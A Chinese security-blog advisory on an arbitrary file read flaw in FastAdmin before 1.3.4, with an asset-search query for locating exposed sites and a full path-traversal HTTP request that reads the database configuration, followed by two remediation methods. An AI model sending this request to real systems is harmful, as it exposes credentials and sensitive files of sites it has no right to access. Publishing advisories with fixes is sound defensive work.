#  FastAdmin任意文件读取漏洞   
原创 king  信安王子   2024-06-17 20:33  
  
 一、漏洞描述  
  
   FastAdmin是一款基于ThinkPHP+Bootstrap开发的快速后台开发框架，FastAdmin基于Apache2.0开源协议发布，免费且不限制商业使用，目前被广泛应用于各大行业应用后台管理。astAdmin框架存在任意文件读取漏洞，攻击者利用此漏洞可以获取系统敏感信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tE6IDCKyaDw6ziaqTjxXL3jLASrClXfdibwzuIhibFoAUVicIiax3nCHzicRUyOoWnEfliaE2cM80ChVtwiaia71EkN5c9w/640?wx_fmt=png&from=appmsg "")  
  
 二、影响版本  
  
FastAdmin版本 < 1.3.4  
  
三、资产测绘  
  
app="FASTADMIN-框架"  
  
 四、漏洞复现  
```
GET /index/ajax/lang?lang=../../application/database HTTP/1.1

Host: 

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tE6IDCKyaDw6ziaqTjxXL3jLASrClXfdibdLBY5S3I00JKp0lxqCTgf8ic7e5IibruBsuJCNKVOw6icp4LhFPiaTwRiaQ/640?wx_fmt=png&from=appmsg "")  
### 五、快速修复方法  
  
如果站点不使用多语言，可以通过修改application/config.php大概第45行的lang_switch_on的对应值修改为false即可。  
### 六、手动修复方法  
  
打开application/common/behavior/Common.php，添加以下代码  
```
    public function appInit()
    {
        $allowLangList = Config::get('allow_lang_list') ?? ['zh-cn', 'en'];
        \think\Lang::setAllowLangList($allowLangList);
    }
```  
  
如图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tE6IDCKyaDw6ziaqTjxXL3jLASrClXfdibXWSKsouKTxepniboF7RLdicQ08RXW7R0PUvU5hY6iaep86DEjfsyF4fxg/640?wx_fmt=png&from=appmsg "输入图片说明")  
  
然后打开application/tags.php，在app_init对应的数组中添加以下代码  
```
'app\\common\\behavior\\Common',
```  
  
如图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tE6IDCKyaDw6ziaqTjxXL3jLASrClXfdibNXHHn5kN31Uicp4bM3vXgTBwSjh9uEBz0wYToaJeCEY8byN5zVicmvSw/640?wx_fmt=png&from=appmsg "输入图片说明")  
  
